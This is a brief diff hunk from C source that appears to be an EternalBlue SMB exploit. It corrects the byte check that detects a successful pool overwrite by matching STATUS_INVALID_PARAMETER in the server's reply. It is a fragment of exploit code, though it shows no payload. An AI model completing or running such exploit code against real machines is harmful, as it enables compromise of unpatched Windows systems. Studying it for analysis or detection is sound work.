@@ -267,7 +267,7 @@ int main(int argc, char** argv)
 	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);
 	
 	//check for EternalBlue overwrite in response packet
-	if (recvbuff[9] == 0x05 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+	if (recvbuff[9] == 0x0D && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 	{
 		printf("Got STATUS_INVALID_PARAMETER!  EternalBlue overwrite successful!\n");
 	}
